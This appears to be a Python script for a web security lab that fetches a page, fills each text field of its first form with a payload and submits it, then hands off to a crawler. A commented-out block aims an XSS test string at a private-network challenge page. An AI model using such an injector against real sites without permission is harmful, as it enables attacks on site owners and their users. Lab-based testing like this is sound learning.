import requests
import urllib.parse
from bs4 import BeautifulSoup
import crawler

def make_soup(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    return soup

def get_form(soup):
    form = soup.find(name='form')
    return form

def get_action(form, base_url):
    action = form['action']
    abs_action = urllib.parse.urljoin(base_url, action)
    return abs_action

def get_form_data(form, payload):
    data = {}
    for inp in form('input'):
        if 'name' in inp.attrs: #do we change all hidden fields as well or only just text
            if 'type' not in inp.attrs or inp['type'] == 'text':
                data[inp['name']] = payload 
    return data

def inject(url, payload, keyword, cookies):
    soup = make_soup(url)
    form = get_form(soup)
    if form != None:
        action = get_action(form, url)
        data = get_form_data(form, payload)
        r = requests.post(action, data=data)
    crawler.crawl(url, payload, keyword, cookies)
##
##if __name__ == '__main__':
##    url = 'http://192.168.18.133/MCIR/xssmh/challenges/challenge2.php'
##    payload = "<script>alert('freki')</script>"
##    soup = make_soup(url)
##    form = get_form(soup)
##    action = get_action(form, url)
##    data = get_form_data(form, payload)
##    print(data)
##    r = requests.post(action, data=data)
##    # make request to the action using
##    print(r)
